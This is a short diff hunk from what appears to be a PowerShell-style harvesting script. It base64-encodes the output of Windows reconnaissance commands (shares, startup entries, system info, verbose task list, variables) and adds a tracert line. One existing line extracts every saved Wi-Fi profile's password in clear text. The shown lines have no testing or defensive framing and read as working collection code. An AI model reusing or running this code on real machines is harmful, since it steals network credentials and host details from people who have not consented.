@@ -36,6 +36,7 @@ shares = Encode64(net share | out-string);
 startup = Encode64(wmic startup get caption,command | out-string);
 systeminfo=Encode64(systeminfo | out-string);
 tasklist = Encode64(tasklist /v | out-string);
+tracert = Encode64(tracert 8.8.8.8);
 variables = Encode64(Get-ChildItem variable: | out-string);
 wifi_profiles = Encode64(netsh wlan show profiles | out-string);
 wifi_pwd = Encode64((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | out-string);
